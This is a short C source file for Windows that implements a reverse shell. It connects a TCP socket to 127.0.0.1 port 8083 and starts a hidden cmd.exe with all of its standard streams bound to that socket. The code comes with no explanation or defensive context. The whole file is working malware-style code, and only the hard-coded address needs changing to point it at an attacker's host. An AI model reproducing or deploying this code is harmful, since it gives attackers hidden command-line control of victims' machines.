#undef UNICODE
#include <tchar.h>
#include <stdio.h>
#include <Winsock2.h>
#include <windows.h>

#pragma comment(lib, "ws2_32.lib")

int main(void)
{

WSADATA wsaData;
SOCKET sock;
SOCKADDR_IN siServer;
STARTUPINFO si;
PROCESS_INFORMATION pi;
char *path="cmd";

WSAStartup(MAKEWORD(2,2), &wsaData);
sock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
siServer.sin_family = AF_INET;
siServer.sin_addr.s_addr = inet_addr("127.0.0.1");
siServer.sin_port = htons(8083);

connect(sock, (SOCKADDR*) &siServer, sizeof(siServer));
memset(&si, 0, sizeof(si));
memset(&pi, 0, sizeof(pi));

si.cb = sizeof(si);
si.dwFlags=STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
si.hStdError=(HANDLE) sock;
si.hStdInput=(HANDLE) sock;
si.hStdOutput=(HANDLE) sock;
si.wShowWindow = SW_HIDE;

CreateProcess(NULL, path, NULL, NULL, TRUE, CREATE_NO_WINDOW | DETACHED_PROCESS, NULL, NULL, &si, &pi);

//WaitForSingleObject(pi.hProcess,INFINITE);
closesocket(sock);
return 0;
}